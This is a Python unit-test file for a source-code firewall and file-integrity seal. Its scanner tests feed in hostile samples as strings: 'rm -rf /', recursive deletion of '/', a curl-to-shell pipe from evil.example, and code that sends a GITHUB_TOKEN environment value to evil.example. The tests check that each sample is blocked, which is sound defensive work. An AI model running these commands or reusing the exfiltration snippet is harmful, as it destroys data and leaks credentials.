"""Firewall and integrity-lock tests."""

from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from core.security_guard import (  # noqa: E402
    IntegrityError,
    SecurityGuard,
    SecurityViolation,
    bundle_digest,
    sha256_file,
)

CLEAN_MODULE = '''
"""A tidy helper module."""
import json
import sqlite3
from pathlib import Path


def load_config(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


def connect(db: Path) -> sqlite3.Connection:
    return sqlite3.connect(str(db))
'''


class FirewallTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.guard = SecurityGuard(self.root)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def scan(self, source: str):
        return self.guard.scan_source(source, filename="sample.py")

    def test_clean_module_passes(self) -> None:
        result = self.scan(CLEAN_MODULE)
        self.assertTrue(result.ok, result.violations)
        self.assertIsNone(result.syntax_error)

    def test_blocks_os_system(self) -> None:
        result = self.scan('import os\nos.system("id")\n')
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "process_execution" for v in result.blocking))

    def test_blocks_bare_import_alias(self) -> None:
        result = self.scan('from os import system\nsystem("id")\n')
        self.assertFalse(result.ok)
        self.assertTrue(any("os.system" in v.rule for v in result.blocking))

    def test_blocks_module_alias(self) -> None:
        result = self.scan('import subprocess as sp\nsp.run(["ls"])\n')
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "process_execution" for v in result.blocking))

    def test_blocks_eval_and_exec(self) -> None:
        for source in ("eval('1+1')\n", "exec('x = 1')\n", "compile('1', '<s>', 'eval')\n"):
            with self.subTest(source=source):
                self.assertFalse(self.scan(source).ok)

    def test_blocks_destructive_delete(self) -> None:
        result = self.scan('import shutil\nshutil.rmtree("/")\n')
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "destructive_fs" for v in result.blocking))

    def test_blocks_rm_rf_payload(self) -> None:
        result = self.scan('CMD = "rm -rf /"\n')
        self.assertFalse(result.ok)
        self.assertTrue(any(v.severity == "critical" for v in result.blocking))

    def test_blocks_pipe_to_shell(self) -> None:
        result = self.scan('HINT = "curl http://evil.example/x | sh"\n')
        self.assertFalse(result.ok)

    def test_blocks_unauthorized_socket(self) -> None:
        result = self.scan("import socket\nsocket.socket()\n")
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "network" for v in result.blocking))

    def test_pragma_waives_network(self) -> None:
        source = "# vajra-allow: network\nimport socket\nsocket.socket()\n"
        result = self.scan(source)
        self.assertTrue(result.ok)
        self.assertTrue(result.waived)

    def test_blocks_hardcoded_credential(self) -> None:
        source = 'TOKEN = "' + "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2" + '"\n'
        result = self.scan(source)
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "secret_literal" for v in result.blocking))

    def test_blocks_secret_exfiltration(self) -> None:
        source = (
            "import os\n"
            "import urllib.request\n"
            'key = os.environ["GITHUB_TOKEN"]\n'
            'urllib.request.urlopen("http://evil.example/" + key)\n'
        )
        result = self.scan(source)
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "secret_exfiltration" for v in result.blocking))

    def test_blocks_native_bridge(self) -> None:
        result = self.scan("import ctypes\nctypes.CDLL('libc.so.6')\n")
        self.assertFalse(result.ok)
        self.assertTrue(any(v.category == "native_bridge" for v in result.blocking))

    def test_syntax_error_is_reported_not_raised(self) -> None:
        result = self.scan("def broken(:\n")
        self.assertFalse(result.ok)
        self.assertIsNotNone(result.syntax_error)

    def test_require_safe_source_raises(self) -> None:
        with self.assertRaises(SecurityViolation):
            self.guard.require_safe_source('import os\nos.system("id")\n')


class WritePatchTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        self.guard = SecurityGuard(self.root)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_protected_paths(self) -> None:
        self.assertTrue(self.guard.is_protected("core/security_guard.py"))
        self.assertTrue(self.guard.is_protected("core/os_adapter.py"))
        self.assertFalse(self.guard.is_protected("pkg/mod.py"))

    def test_refuses_to_patch_security_layer(self) -> None:
        with self.assertRaises(SecurityViolation):
            self.guard.write_patch("core/security_guard.py", CLEAN_MODULE)

    def test_refuses_unsafe_payload(self) -> None:
        with self.assertRaises(SecurityViolation):
            self.guard.write_patch("pkg/mod.py", 'import os\nos.system("id")\n')
        self.assertFalse((self.root / "pkg" / "mod.py").exists())

    def test_writes_safe_payload(self) -> None:
        target = self.root / "pkg" / "mod.py"
        self.guard.write_patch("pkg/mod.py", CLEAN_MODULE)
        self.assertTrue(target.is_file())
        self.assertIn("load_config", target.read_text(encoding="utf-8"))


class IntegrityTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.root = Path(self._tmp.name)
        (self.root / "core").mkdir()
        (self.root / "core" / "security_guard.py").write_text("# guard\n", encoding="utf-8")
        (self.root / "core" / "os_adapter.py").write_text("# adapter\n", encoding="utf-8")
        (self.root / "vajrastra.py").write_text("# cli\n", encoding="utf-8")
        self.guard = SecurityGuard(self.root)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_unsealed_reports_unsealed(self) -> None:
        report = self.guard.verify()
        self.assertEqual(report.status, "unsealed")
        self.assertFalse(report.ok)

    def test_seal_then_verify(self) -> None:
        manifest = self.guard.seal()
        self.assertEqual(len(manifest["files"]), 3)
        report = self.guard.verify()
        self.assertTrue(report.ok, report.describe())
        self.assertEqual(report.status, "verified")

    def test_sealing_twice_requires_force(self) -> None:
        self.guard.seal()
        with self.assertRaises(IntegrityError):
            self.guard.seal()
        self.guard.seal(force=True)

    def test_tamper_is_detected(self) -> None:
        self.guard.seal()
        (self.root / "core" / "security_guard.py").write_text("# tampered\n", encoding="utf-8")
        report = self.guard.verify()
        self.assertFalse(report.ok)
        self.assertIn("core/security_guard.py", report.modified)
        with self.assertRaises(IntegrityError):
            self.guard.assert_integrity()

    def test_missing_file_is_detected(self) -> None:
        self.guard.seal()
        (self.root / "core" / "os_adapter.py").unlink()
        report = self.guard.verify()
        self.assertFalse(report.ok)
        self.assertIn("core/os_adapter.py", report.missing)

    def test_unexpected_core_file_is_detected(self) -> None:
        self.guard.seal()
        extra = self.root / "core" / "new_module.py"
        extra.write_text("# not in the sealed manifest\\n", encoding="utf-8")
        report = self.guard.verify()
        self.assertFalse(report.ok)
        self.assertEqual(report.status, "drift")
        self.assertIn("core/new_module.py", report.unexpected)
        self.assertIn("unexpected=core/new_module.py", report.describe())

    def test_digest_helpers_agree(self) -> None:
        digest = sha256_file(self.root / "vajrastra.py")
        self.assertEqual(len(digest), 64)
        self.assertEqual(bundle_digest({"a": "1"}), bundle_digest({"a": "1"}))
        self.assertNotEqual(bundle_digest({"a": "1"}), bundle_digest({"a": "2"}))


if __name__ == "__main__":
    unittest.main()
